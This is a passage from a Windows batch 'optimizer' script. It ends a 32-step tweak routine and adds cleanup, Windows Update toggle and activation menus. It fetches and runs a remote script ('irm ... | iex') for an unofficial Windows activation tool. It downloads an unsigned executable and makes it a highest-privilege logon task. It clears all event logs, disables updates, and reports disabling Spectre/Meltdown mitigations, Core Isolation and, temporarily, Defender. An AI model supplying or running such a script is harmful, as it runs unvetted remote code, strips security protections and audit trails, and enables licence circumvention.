:: Apply NIP profile via Profile Inspector - writes settings directly to NVIDIA driver database
echo  Applying NVIDIA 3D profile...
start /WAIT "" "!_NVPI!" "!_NVNIP!"
if !ERRORLEVEL! neq 0 set STEP_ERR=1

:: Registry backup - enables "Use advanced 3D image settings" in NVIDIA Control Panel
:: This is a UI-level setting not included in NIP profiles, so we set it directly
REG ADD "HKCU\Software\NVIDIA Corporation\Global\NVTweak" /v "Splendid" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1

:NVIDIA_CLEANUP
if exist "!_NVPI!" del "!_NVPI!" >nul 2>&1
if exist "!_NVNIP_B64!" del "!_NVNIP_B64!" >nul 2>&1
if exist "!_NVNIP!" del "!_NVNIP!" >nul 2>&1

:NVIDIA_DONE
if !STEP_ERR!==0 (
    echo  [OK] NVIDIA 3D Profile Applied
    set /a PASS+=1
) else (
    echo  [FAIL] NVIDIA 3D Profile
    set /a FAIL+=1
    echo NVIDIA 3D Profile>> "!_FAILS!"
)

:: ================================================
:: STEP 32 - ISLC Setup
:: ================================================
echo [STEP 32/32] Setting up ISLC (Intelligent Standby List Cleaner)...
set STEP_ERR=0

set "AppDir=!USERPROFILE!\Documents\ISLC"
set "ExeName=Intelligent standby list cleaner ISLC.exe"
set "ConfigName=Intelligent standby list cleaner ISLC.exe.Config"
set "ExeUrl=https://raw.githubusercontent.com/Yel1oww/WinLightOptimizer/main/Intelligent%%20standby%%20list%%20cleaner%%20ISLC.exe"
set "ConfigUrl=https://raw.githubusercontent.com/Yel1oww/WinLightOptimizer/main/Intelligent%%20standby%%20list%%20cleaner%%20ISLC.exe.Config"

:: Check if already running using wmic (tasklist truncates long names)
wmic process where "name='!ExeName!'" get processid 2>NUL | findstr [0-9] >NUL
if "!ERRORLEVEL!"=="0" (
    echo  - ISLC is already running. Skipping install.
) else (
    if not exist "!AppDir!" mkdir "!AppDir!" >nul 2>&1

    :: Download exe only if not already present
    if not exist "!AppDir!\!ExeName!" (
        curl -s -L -o "!AppDir!\!ExeName!" "!ExeUrl!"
        if !ERRORLEVEL! neq 0 set STEP_ERR=1
    )

    :: Always download config fresh so RAM threshold is recalculated correctly each run
    curl -s -L -o "!AppDir!\!ConfigName!" "!ConfigUrl!"
    if !ERRORLEVEL! neq 0 set STEP_ERR=1

    :: Update Free memory value to half of installed RAM
    :: Uses char 34 to avoid batch double-quote parsing crashes inside the else block
    powershell -NoProfile -Command "$q=[char]34;$half=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1MB/2);$p='!AppDir!\!ConfigName!';$t=[IO.File]::ReadAllText($p);$t=[regex]::Replace($t,'(<add key='+$q+'Free memory'+$q+' value='+$q+')\d+('+$q+')','${1}'+$half+'${2}');[IO.File]::WriteAllText($p,$t)" >nul 2>&1
    if !ERRORLEVEL! neq 0 set STEP_ERR=1

    :: Create persistent scheduled task to launch ISLC at every user logon
    powershell -NoProfile -Command "$exe='!AppDir!\!ExeName!';$a=New-ScheduledTaskAction -Execute $exe -Argument '-minimized';$t=New-ScheduledTaskTrigger -AtLogOn;$s=New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew;Register-ScheduledTask -TaskName 'ISLC_AutoStart' -Action $a -Trigger $t -Settings $s -RunLevel Highest -Force -ErrorAction SilentlyContinue|Out-Null" >nul 2>&1
    if !ERRORLEVEL! neq 0 set STEP_ERR=1

    :: Launch ISLC minimized right now for this session
    if exist "!AppDir!\!ExeName!" (
        pushd "!AppDir!"
        start "" /MIN "!ExeName!" -minimized
        popd
    )
)

if !STEP_ERR!==0 (
    echo  [OK] ISLC Setup
    set /a PASS+=1
) else (
    echo  [FAIL] ISLC Setup
    set /a FAIL+=1
    echo ISLC Setup>> "!_FAILS!"
)

:: Re-enable Defender
echo.
echo Re-enabling Windows Defender...
:: Remove the hosts folder exclusion we added at the start
powershell -NoProfile -Command "Remove-MpPreference -ExclusionPath '$env:SystemRoot\System32\drivers\etc' -ErrorAction SilentlyContinue" >nul 2>&1
:: Remove the policy registry keys we set (they take priority over UI settings when present)
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /f >nul 2>&1
:: Restore Defender services to automatic and restart them
sc config WinDefend start= auto >nul 2>&1
sc config WdNisSvc start= auto >nul 2>&1
net start WinDefend >nul 2>&1
net start WdNisSvc >nul 2>&1
:: Re-enable all Defender features (Core Isolation stays OFF - controlled by Step 19 registry keys)
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false -DisablePrivacyMode $false -DisableScriptScanning $false -EnableNetworkProtection Enabled -EnableControlledFolderAccess Enabled -MAPSReporting Advanced -SubmitSamplesConsent SendSafeSamples -PUAProtection Enabled -ErrorAction SilentlyContinue" >nul 2>&1
echo  [OK] Defender re-enabled
echo.

:: ================================================
:: RESULTS SUMMARY
:: ================================================

echo.
echo ================================================
echo        ALL OPTIMIZATIONS COMPLETE!
echo ================================================
echo.
echo  Steps completed:  !PASS!/32
echo  Steps failed:     !FAIL!/32
echo.

if !FAIL! GTR 0 (
    color 0E
    echo  -- The following steps reported errors:
    echo.
    if exist "!_FAILS!" type "!_FAILS!"
    echo.
    echo  Note: Some errors may be harmless ^(e.g. a key already exists,
    echo  a setting is unsupported on this Windows version, or an ETS
    echo  session was not active^).
    echo.
) else (
    echo  All steps completed successfully!
    echo.
)

echo  [1]  Visual performance tweaks
echo  [2]  App/service timeout tweaks
echo  [3]  Registry tweaks (Live Tiles, Ink, DPC/ISR)
echo  [4]  CPU power tweaks
echo  [5]  Display tweaks
echo  [6]  GPU tweaks
echo  [7]  Network + TCP/IP + AFD tweaks
echo  [8]  System + USB tweaks
echo  [9]  Boot + CPU scheduler tweaks
echo  [10] RDP disabled
echo  [11] Security (SSL/TLS, NTLM, SMB1, NetBIOS)
echo  [12] Microsoft telemetry blocked via HOSTS file + DNS NRPT + DiagTrack firewall rule
echo  [13] Core.pow power plan imported and activated
echo  [14] Event Trace Sessions (ETS) disabled
echo  [15] Privacy and bloat tweaks (location, Edge, Copilot, telemetry, Game DVR, etc.)
echo  [16] Additional privacy tweaks (search, speech, OneDrive sync, background apps, CEIP)
echo  [17] Custom visual effects (transparency off, thumbnails, font smoothing, no animations)
echo  [18] PowerShell execution policy set to Unrestricted
echo  [19] Core Isolation and Memory Integrity disabled
echo  [20] Spectre and Meltdown mitigations disabled
echo  [21] Unnecessary services disabled
echo  [22] Scheduled tasks cleanup (telemetry, diagnostics, CEIP, maintenance)
echo  [23] Disk tweaks (NTFS last-access off, 8.3 names off, hibernation off, fixed pagefile)
echo  [24] UI and taskbar cleanup (widgets, chat, Start suggestions, lock screen ads, Sticky Keys)
echo  [25] Audio tweaks (enhancements off, MMCSS priority tuning)
echo  [26] NVIDIA/AMD cleanup (ULPS disabled, telemetry services stopped)
echo  [27] Microsoft Edge completely removed (folders, registry, shortcuts, dummy lock)
echo  [28] OneDrive completely uninstalled (official uninstaller + folders removed)
echo  [29] Microsoft Store bloatware removed (Candy Crush, TikTok, Teams, Skype +50 more)
echo  [30] Additional UI tweaks (LMS, WPBT, WifiSense, Paint/Notepad AI, file exts, right-click menu, taskbar)
echo  [31] NVIDIA 3D profile applied ^(NVIDIA GPUs only - skipped on non-NVIDIA systems^)
echo  [32] ISLC downloaded, RAM threshold configured, and launched minimized
echo.
echo  A RESTART IS REQUIRED for all changes to take effect!
echo.
set /p RESTART="Restart now? (Y/N): "
if /i "%RESTART%"=="Y" shutdown /r /t 5 /c "Restarting to apply optimizations..."
echo.
pause
if exist "!_FAILS!" del "!_FAILS!" >nul 2>&1
goto :RETURN_MENU

:: ====================================================
::  OPTION 2 - CLEAN TEMP FILES
:: ====================================================
:OPT2
cls
color 0A
echo.
echo  =====================================================
echo         Win Light Optimizer  -  Cleanup Tool
echo  =====================================================
echo.

:: Get disk free space BEFORE cleanup (drive C)
for /f "tokens=3" %%a in ('dir c:\ /-c ^| find "bytes free"') do set BEFORE=%%a

echo  [1/10] Cleaning Windows Temp folder...
del /s /f /q %SystemRoot%\Temp\*.* >nul 2>&1
rd /s /q %SystemRoot%\Temp >nul 2>&1
md %SystemRoot%\Temp >nul 2>&1

echo  [2/10] Cleaning User Temp folder...
del /s /f /q %TEMP%\*.* >nul 2>&1

echo  [3/10] Cleaning Prefetch...
del /s /f /q %SystemRoot%\Prefetch\*.* >nul 2>&1

echo  [4/10] Cleaning Windows Update Cache...
net stop wuauserv >nul 2>&1
net stop bits >nul 2>&1
del /s /f /q %SystemRoot%\SoftwareDistribution\Download\*.* >nul 2>&1
net start wuauserv >nul 2>&1
net start bits >nul 2>&1

echo  [5/10] Cleaning Log Files...
del /s /f /q %SystemRoot%\Logs\*.log >nul 2>&1
del /s /f /q %SystemRoot%\inf\*.log >nul 2>&1
del /s /f /q %SystemRoot%\system32\LogFiles\*.* >nul 2>&1
del /s /f /q %SystemRoot%\Panther\*.log >nul 2>&1
del /s /f /q %SystemRoot%\debug\*.log >nul 2>&1

echo  [6/10] Clearing Windows Event Viewer Logs...
for /F "tokens=*" %%G in ('wevtutil.exe el') do (
    wevtutil.exe cl "%%G" >nul 2>&1
)

echo  [7/10] Flushing DNS Cache...
ipconfig /flushdns >nul 2>&1

echo  [8/10] Resetting Winsock...
netsh winsock reset >nul 2>&1

echo  [9/10] Cleaning Recycle Bin...
rd /s /q C:\$Recycle.Bin >nul 2>&1

echo  [10/10] Running Disk Cleanup (silent)...
cleanmgr /sagerun:1 >nul 2>&1

:: Get disk free space AFTER cleanup
for /f "tokens=3" %%a in ('dir c:\ /-c ^| find "bytes free"') do set AFTER=%%a

:: Calculate freed space in MB (trim last 6 digits = divide by ~1MB)
set /a FREED_MB=(%AFTER:~0,-6% - %BEFORE:~0,-6%)
if %FREED_MB% lss 0 set FREED_MB=0
set /a FREED_GB=%FREED_MB% / 1024

echo.
echo  =====================================================
echo    Cleanup Complete!
echo  =====================================================
echo.
echo   Disk space BEFORE : %BEFORE% bytes
echo   Disk space AFTER  : %AFTER% bytes
echo.
if %FREED_GB% gtr 0 (
    echo   Space Freed: ~%FREED_GB% GB ^(%FREED_MB% MB^)
) else (
    echo   Space Freed: ~%FREED_MB% MB
)
echo.
echo   [OK] Windows Temp files cleared
echo   [OK] User Temp files cleared
echo   [OK] Prefetch cleared
echo   [OK] Windows Update cache cleared
echo   [OK] Log files deleted
echo   [OK] Event Viewer logs cleared
echo   [OK] DNS cache flushed
echo   [OK] Winsock reset
echo   [OK] Recycle Bin emptied
echo   [OK] Disk Cleanup run
echo.
echo  =====================================================
echo.
pause
goto :RETURN_MENU

:: ====================================================
::  OPTION 3 - WINDOWS UPDATE TOGGLE
:: ====================================================
:OPT3
cls
color 0A
echo.
echo  =====================================================
echo         Win Light Optimizer  -  Windows Update Toggle
echo  =====================================================
echo.
echo   [1]  Disable Windows Update
echo   [2]  Enable Windows Update
echo   [0]  Back to main menu
echo.
echo  =====================================================
echo.
set "WU_CHOICE="
set /p WU_CHOICE="  Select option: "
echo.

if "%WU_CHOICE%"=="0" goto :MAIN_MENU
if "%WU_CHOICE%"=="1" goto :WU_DISABLE
if "%WU_CHOICE%"=="2" goto :WU_ENABLE
echo  Invalid option.
timeout /t 2 >nul
goto :OPT3

:WU_DISABLE
echo  Disabling Windows Update...
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DisableWindowsUpdateAccess" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d 0 /f >nul 2>&1
sc config dosvc start= disabled >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc config UsoSvc start= disabled >nul 2>&1
net stop dosvc >nul 2>&1
net stop wuauserv >nul 2>&1
net stop UsoSvc >nul 2>&1
echo  [OK] Windows Update disabled.
echo.
pause
goto :RETURN_MENU

:WU_ENABLE
echo  Enabling Windows Update...
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DisableWindowsUpdateAccess" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d 1 /f >nul 2>&1
sc config dosvc start= auto >nul 2>&1
sc config wuauserv start= auto >nul 2>&1
sc config UsoSvc start= auto >nul 2>&1
sc config bits start= auto >nul 2>&1
sc config "cryptsvc" start= auto >nul 2>&1
sc config "TrustedInstaller" start= auto >nul 2>&1
net start dosvc >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
echo  [OK] Windows Update enabled and restored.
echo.
pause
goto :RETURN_MENU

:: ====================================================
::  OPTION 4 - WINDOWS ACTIVATION
:: ====================================================
:OPT4
cls
color 0A
echo.
echo  =====================================================
echo         Win Light Optimizer  -  Windows Activation
echo  =====================================================
echo.
echo  Launching MAS activation tool - follow the prompts...
echo  Requires internet connection.
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://get.activated.win | iex"
echo.
pause
goto :RETURN_MENU

:: ====================================================
::  RETURN TO MENU
:: ====================================================
:RETURN_MENU
echo.
set "BACK_CHOICE="
set /p BACK_CHOICE="  Return to main menu? (Y/N): "
if /i "%BACK_CHOICE%"=="Y" goto :MAIN_MENU

:EXIT
echo.
echo  Goodbye!
echo.
exit /b
